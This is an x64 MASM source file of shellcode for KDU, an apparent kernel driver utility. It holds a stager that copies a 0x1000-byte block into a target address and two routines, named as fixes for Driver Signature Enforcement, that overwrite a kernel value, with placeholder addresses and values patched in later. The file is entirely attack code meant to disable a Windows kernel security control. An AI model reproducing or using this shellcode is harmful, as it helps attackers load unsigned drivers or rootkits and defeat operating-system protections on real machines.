;*******************************************************************************
;
;  (C) COPYRIGHT AUTHORS, 2022
;
;  TITLE:       SHELLMASM.ASM
;
;  VERSION:     1.28
;
;  DATE:        01 Dec 2022
;
;  Masm shellcode implementation for KDU.
;
; THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
; ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
; TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
; PARTICULAR PURPOSE.
;
;*******************************************************************************/
_TEXT$00 segment para 'CODE'

    ALIGN 16
    PUBLIC ZmShellStager
    PUBLIC ZmShellStagerEnd
    PUBLIC ZmShellDSEFix
    PUBLIC ZmShellDSEFixEnd
    PUBLIC BaseShellDSEFix
    PUBLIC BaseShellDSEFixEnd

ZmShellStager PROC
    pop rax
    push rdi
    push rsi
    mov rax, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rax, rdx
    mov rdi, rax
    mov rsi, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rsi, rdx
    xor rcx, rcx
    inc cl
    shl ecx, 0ch
    rep movsb
    pop rsi
    pop rdi
    ret
ZmShellStager ENDP

ZmShellStagerEnd PROC
    ret
ZmShellStagerEnd ENDP

ZmShellDSEFix PROC
    pop rax
    mov rax, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rax, rdx
    mov rcx, 01122334455667788h
    mov rdx, 08877665544332211h
    xor rcx, rdx
    mov qword ptr[rax], rcx
    ret
ZmShellDSEFix ENDP

ZmShellDSEFixEnd PROC
    ret
ZmShellDSEFixEnd ENDP

BaseShellDSEFix PROC
    mov rax, 01122334455667788h
    mov rcx, 08877665544332211h
    mov qword ptr[rax], rcx
    ret
BaseShellDSEFix ENDP

BaseShellDSEFixEnd PROC
    ret
BaseShellDSEFixEnd ENDP

_TEXT$00 ENDS
	
END
